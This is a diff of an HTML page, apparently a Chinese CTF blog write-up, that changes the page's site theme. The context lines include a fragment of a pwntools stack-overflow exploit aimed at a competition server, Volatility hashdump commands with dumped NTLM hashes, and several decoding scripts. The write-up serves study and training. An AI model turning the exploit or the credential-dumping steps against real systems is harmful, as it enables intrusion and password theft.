@@ -1,153 +1,86 @@
 <!DOCTYPE html>
-<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
-<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  
-  
-  <link rel="shortcut icon" href="../img/favicon.ico">
-  <title>HXB writeup - hkk_blog</title>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />
+<meta charset="utf-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<title>HXB writeup - hkk_blog</title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-  <link rel="stylesheet" href="../css/theme.css" />
-  <link rel="stylesheet" href="../css/theme_extra.css" />
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css" />
-  
-  <script>
-    // Current page data
-    var mkdocs_page_name = "HXB writeup";
-    var mkdocs_page_input_path = "\u53d1\u8d22writeup.md";
-    var mkdocs_page_url = null;
-  </script>
-  
-  <script src="../js/jquery-2.1.1.min.js" defer></script>
-  <script src="../js/modernizr-2.8.3.min.js" defer></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
-  <script>hljs.initHighlightingOnLoad();</script> 
-  
+<meta name="generator" content="mkdocs-1.0.4, mkdocs-gitbook-1.0.7">
+
+<link rel="shortcut icon" href="../images/favicon.ico" type="image/x-icon">
+<meta name="HandheldFriendly" content="true"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta rel="next" href="" />
+<link href="../css/style.min.css" rel="stylesheet"> 
 </head>
 
-<body class="wy-body-for-nav" role="document">
+<body>
+<div class="book">
+<div class="book-summary">
+<div id="book-search-input" role="search">
+<input type="text" placeholder="Type to search" />
+</div> <!-- end of book-search-input -->
 
-  <div class="wy-grid-for-nav">
+<nav role="navigation">
+<ul class="summary">
+<li>
+<a href=".." target="_blank" class="custom-link">hkk_blog</a>
+</li>
+<li class="divider"></li>
+<li class="chapter" data-path="">
+<a href="..">Welcome to hkkblog</a>
+<li class="chapter" data-path="[HTB]DT/">
+<a href="../[HTB]DT/">[HTB]Docter</a>
+<li class="chapter" data-path="docker和phpstorm搭建php开发环境/">
+<a href="../docker和phpstorm搭建php开发环境/">docker和phpstorm搭建php开发环境</a>
+<li class="chapter" data-path="ssh隧道/">
+<a href="../ssh隧道/">ssh隧道</a>
+<li class="chapter" data-path="初探pickle反序列化/">
+<a href="../初探pickle反序列化/">初探pickle反序列化</a>
+<li class="chapter active" data-path="发财writeup/">
+<a href="./">HXB writeup</a>
+<li class="divider"></li>
 
-    
-    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
-    <div class="wy-side-scroll">
-      <div class="wy-side-nav-search">
-        <a href=".." class="icon icon-home"> hkk_blog</a>
-        <div role="search">
-  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
-    <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
-  </form>
-</div>
-      </div>
 
-      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
-                <ul>
-                    <li class="toctree-l1"><a class="reference internal" href="..">Welcome to hkkblog</a>
-                    </li>
-                </ul>
-                <ul>
-                    <li class="toctree-l1"><a class="reference internal" href="../%5BHTB%5DDT/">[HTB]Docter</a>
-                    </li>
-                </ul>
-                <ul>
-                    <li class="toctree-l1"><a class="reference internal" href="../docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/">docker和phpstorm搭建php开发环境</a>
-                    </li>
-                </ul>
-                <ul>
-                    <li class="toctree-l1"><a class="reference internal" href="../ssh%E9%9A%A7%E9%81%93/">ssh隧道</a>
-                    </li>
-                </ul>
-                <ul>
-                    <li class="toctree-l1"><a class="reference internal" href="../%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">初探pickle反序列化</a>
-                    </li>
-                </ul>
-                <ul class="current">
-                    <li class="toctree-l1 current"><a class="reference internal current" href="./">HXB writeup</a>
-    <ul class="current">
-    <li class="toctree-l2"><a class="reference internal" href="#web">WEB</a>
-        <ul>
-    <li class="toctree-l3"><a class="reference internal" href="#_1">题目名字不重要反正题挺简单的</a>
-    </li>
-    <li class="toctree-l3"><a class="reference internal" href="#newwebsite">NewWebsite</a>
-    </li>
-        </ul>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#cpypto">CPYPTO</a>
-        <ul>
-    <li class="toctree-l3"><a class="reference internal" href="#_2">古典美++</a>
-    </li>
-        </ul>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#pwn">pwn</a>
-        <ul>
-    <li class="toctree-l3"><a class="reference internal" href="#pwn_printf">pwn_printf</a>
-    </li>
-        </ul>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#misc">MISC</a>
-        <ul>
-    <li class="toctree-l3"><a class="reference internal" href="#_3">颜文字之谜</a>
-    </li>
-    <li class="toctree-l3"><a class="reference internal" href="#passwd">passwd</a>
-    </li>
-    <li class="toctree-l3"><a class="reference internal" href="#_4">虚实之间</a>
-    </li>
-    <li class="toctree-l3"><a class="reference internal" href="#_5">隐藏的秘密</a>
-    </li>
-        </ul>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#re">RE</a>
-        <ul>
-    <li class="toctree-l3"><a class="reference internal" href="#easy_c">easy_c++</a>
-    </li>
-    <li class="toctree-l3"><a class="reference internal" href="#easyre">easyre</a>
-    </li>
-    <li class="toctree-l3"><a class="reference internal" href="#reme">ReMe</a>
-    </li>
-        </ul>
-    </li>
-    </ul>
-                    </li>
-                </ul>
-      </div>
-    </div>
-    </nav>
 
-    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+<li><a href="http://www.mkdocs.org">
+Published with MkDocs
+</a></li>
 
-      
-      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
-        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
-        <a href="..">hkk_blog</a>
-      </nav>
+<li><a href="https://github.com/GitbookIO/theme-default">
+Theme by GitBook
+</a></li>
+</ul>
 
-      
-      <div class="wy-nav-content">
-        <div class="rst-content">
-          <div role="navigation" aria-label="breadcrumbs navigation">
-  <ul class="wy-breadcrumbs">
-    <li><a href="..">Docs</a> &raquo;</li>
-    
-      
-    
-    <li>HXB writeup</li>
-    <li class="wy-breadcrumbs-aside">
-      
-    </li>
-  </ul>
-  
-  <hr/>
-</div>
-          <div role="main">
-            <div class="section">
-              
-                <h1 id="hxb-writeup">HXB writeup</h1>
+</nav>
+
+</div> <!-- end of book-summary -->
+
+<div class="book-body">
+<div class="body-inner">
+<div class="book-header" role="navigation">
+
+<!-- Title -->
+<h1>
+<i class="fa fa-circle-o-notch fa-spin"></i>
+<a href="." ></a>
+</h1>
+
+</div> <!-- end of book-header -->
+
+<div class="page-wrapper" tabindex="-1" role="main">
+<div class="page-inner">
+<div id="book-search-results">
+<div class="search-noresults">
+
+<section class="normal markdown-section">
+
+
+
+<h1 id="hxb-writeup">HXB writeup</h1>
 <h2 id="web">WEB</h2>
 <h3 id="_1">题目名字不重要反正题挺简单的</h3>
 <p>直接传参file=phpinfo，flag被写到环境变量</p>
@@ -166,7 +99,7 @@
 <h3 id="pwn_printf">pwn_printf</h3>
 <p>栈溢出，通过puts泄露函数地址，计算偏移量得到system函数地址来get shell</p>
 <p>exp如下：</p>
-<pre><code class="language-python">from pwn import *
+<pre><code class="python">from pwn import *
 context.log_level = 'debug'
 p = remote('47.111.104.169',56706)
 elf = ELF('./pwn_printf')
@@ -208,6 +141,7 @@ p.sendline(payload4)
 p.interactive()
 
 </code></pre>
+
 <p><img alt="img5" src="../img/pwn.png" /></p>
 <h2 id="misc">MISC</h2>
 <h3 id="_3">颜文字之谜</h3>
@@ -220,7 +154,7 @@ p.interactive()
 <p><img alt="img_stegsnow" src="../img/img_stegsnow.png" /></p>
 <p>那么尝试把文件里面隐藏的base64部分利用起来</p>
 <p>网上找个base64隐写脚本</p>
-<pre><code class="language-python">b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+<pre><code class="python">b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 with open('C:/Users/kai/Desktop/base.txt', 'rb') as f:
     bin_str = ''
     for line in f.readlines():
@@ -232,13 +166,15 @@ with open('C:/Users/kai/Desktop/base.txt', 'rb') as f:
             bin_str += bin(offset)[2:].zfill(equalnum * 2)
         print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])
 </code></pre>
+
 <p>结果是key:"lorrie"</p>
 <p>解码看看
 <img alt="img_lorrie" src="../img/img_lorrie.png" /></p>
 <p>flag头和尾是对的，乱码感觉像是编码问题，我们把它导出为16进制试试</p>
-<pre><code class="language-shell">a=`stegsnow  -p &quot;lorrie&quot; index-demo.html `
+<pre><code class="shell">a=`stegsnow  -p &quot;lorrie&quot; index-demo.html `
 echo $a | perl -ne 'printf&quot;%x&quot;, ord for split //'
 </code></pre>
+
 <p>得到的结果放文件里，再用010导入看看</p>
 <p>默认的ascii编码下依旧是乱码
 <img alt="img_ascii" src="../img/img_ascii.png" /></p>
@@ -253,8 +189,9 @@ echo $a | perl -ne 'printf&quot;%x&quot;, ord for split //'
 <p>成功拿到flag</p>
 <h3 id="passwd">passwd</h3>
 <p>是一道内存取证题，题目要求我们去拿到当前用户的密码</p>
-<pre><code class="language-shell">python vol.py -f ./my_mem/passwd.raw --profile=Win7SP1x86_23418 hashdump
+<pre><code class="shell">python vol.py -f ./my_mem/passwd.raw --profile=Win7SP1x86_23418 hashdump
 </code></pre>
+
 <blockquote>
 <p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -270,19 +207,22 @@ CTF:1000:aad3b435b51404eeaad3b435b51404ee:0a640404b5c386ab12092587fe19cd02:::</p
 然后栅栏密码解码得到flag</p>
 <h3 id="_5">隐藏的秘密</h3>
 <p>查看进程，发现notepad.exe，pid为2440，不过内容是乱码的，估计存在编码问题，那我们干脆把进程导出</p>
-<pre><code class="language-shell">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 memdump -p 2440 -D ./my_mem/out/hxb
+<pre><code class="shell">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 memdump -p 2440 -D ./my_mem/out/hxb
 </code></pre>
+
 <p>用diskgenius打开导出的dmp文件可以看到</p>
 <p><img alt="img6" src="../img/img6.png" /></p>
-<pre><code class="language-shell">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;
+<pre><code class="shell">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;
 </code></pre>
+
 <p>于是导出用户名和密码，批量解NTLM，最后尝试密码为<code>NIAIWOMA</code>的账户和密码MD5
 是flag</p>
 <p>再看一下日志</p>
-<pre><code class="language-shell">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 evtlogs -D ./my_mem/out/hxb
+<pre><code class="shell">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 evtlogs -D ./my_mem/out/hxb
 
 python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 timeliner &gt; ./my_mem/out/hxb
 </code></pre>
+
 <p>发现这个电脑权限都是写在用户组里面的，常规用户应该都是<code>S-1-5-18</code>这个用户组的</p>
 <p>但是看不到具体是哪些用户进行的操作，是我太菜了</p>
 <p>复现的时候发现 <code>SAM\Domains\Account\Users\Names</code> 这个注册表目录下存在所有用户，查看用户的键值，可以发现存在一个注册表最后修改的时间</p>
@@ -290,7 +230,7 @@ python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 timeliner &gt; ./my_
 <p><img alt="img_regtime" src="../img/img_regtime.png" /></p>
 <p>查看几个用户，发现他们的修改时间都在 14:02 这个时间
 而整个表的最后修改时间是在 14:07 之后，所以只需要把 14:07 修改注册表的用户找出来就行了，搓个脚本</p>
-<pre><code class="language-python"># coding=utf-8
+<pre><code class="python"># coding=utf-8
 import os
 
 hide_mem = &quot;../my_mem/hide.vmem&quot;
@@ -313,22 +253,24 @@ for i in user_list:
     if &quot;14:02:09&quot; not in output:
         print(i)
 </code></pre>
+
 <p>文件路径需要根据具体情况进行修改
 <img alt="img_AI" src="../img/img_AI.png" /></p>
 <p>十几分钟大概可以出来</p>
 <h2 id="re">RE</h2>
 <h3 id="easy_c">easy_c++</h3>
 <p>简单异或直接脚本跑</p>
-<pre><code class="language-python">a=&quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*{*+*$|,&quot;
+<pre><code class="python">a=&quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*{*+*$|,&quot;
 b=&quot;&quot;
 for i in range(len(a)):
     b+=chr(ord(a[i])^i)
 print(b)
 </code></pre>
+
 <h3 id="easyre">easyre</h3>
 <p>动态调试，一位一位爆出来</p>
 <h3 id="reme">ReMe</h3>
-<pre><code class="language-python">import hashlib
+<pre><code class="python">import hashlib
 
 list = [
  'e5438e78ec1de10a2693f9cffb930d23',
@@ -384,54 +326,36 @@ if __name__ == &quot;__main__&quot;:
             if md5 == list[line]:
                 print line,'-&gt;',chr(i)
 </code></pre>
+
 <p>然后按顺序排序MD5即可</p>
-              
-            </div>
-          </div>
-          <footer>
-  
-    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
-      
-      
-        <a href="../%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-neutral" title="初探pickle反序列化"><span class="icon icon-circle-arrow-left"></span> Previous</a>
-      
-    </div>
-  
 
-  <hr/>
 
-  <div role="contentinfo">
-    <!-- Copyright etc -->
-    
-  </div>
+</section>
+</div> <!-- end of search-noresults -->
+<div class="search-results">
+<div class="has-results">
 
-  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
-</footer>
-      
-        </div>
-      </div>
+<h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+<ul class="search-results-list"></ul>
 
-    </section>
+</div> <!-- end of has-results -->
+<div class="no-results">
 
-  </div>
+<h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
 
-  <div class="rst-versions" role="note" aria-label="versions">
-    <span class="rst-current-version" data-toggle="rst-current-version">
-      
-      
-        <span><a href="../%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #fcfcfc;">&laquo; Previous</a></span>
-      
-      
-    </span>
-</div>
-    <script>var base_url = '..';</script>
-    <script src="../js/theme.js" defer></script>
-      <script src="../search/main.js" defer></script>
-    <script defer>
-        window.onload = function () {
-            SphinxRtdTheme.Navigation.enable(true);
-        };
-    </script>
+</div> <!-- end of no-results -->
+</div> <!-- end of search-results -->
+</div> <!-- end of book-search-results -->
 
+</div> <!-- end of page-inner -->
+</div> <!-- end of page-wrapper -->
+
+</div> <!-- end of body-inner -->
+
+</div> <!-- end of book-body -->
+<script src="../js/main.js"></script>
+<script src="../search/main.js"></script>
+<script src="../js/gitbook.min.js"></script>
+<script src="../js/theme.min.js"></script>
 </body>
 </html>
